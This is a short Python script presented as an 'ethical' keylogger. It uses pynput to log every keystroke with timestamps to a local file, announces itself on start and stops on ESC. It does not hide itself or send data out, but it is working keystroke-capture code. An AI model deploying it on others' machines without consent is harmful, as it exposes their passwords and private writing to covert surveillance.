# keylogger.py
"""
Ethical Keylogger
-----------------
For research, parental control, or personal monitoring ONLY.
Do NOT use without explicit permission.
"""

from pynput import keyboard
import logging
import os
from datetime import datetime

# Ensure log directory exists
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# Log file name with timestamp
log_file = os.path.join(LOG_DIR, f"key_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

def on_press(key):
    """Handle key press events"""
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """Handle key release events"""
    # Press ESC to stop the keylogger safely
    if key == keyboard.Key.esc:
        return False

def main():
    print("🔑 Ethical Keylogger started. Press ESC to stop.")
    print(f"Logging to: {log_file}")

    # Start listening to the keyboard
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
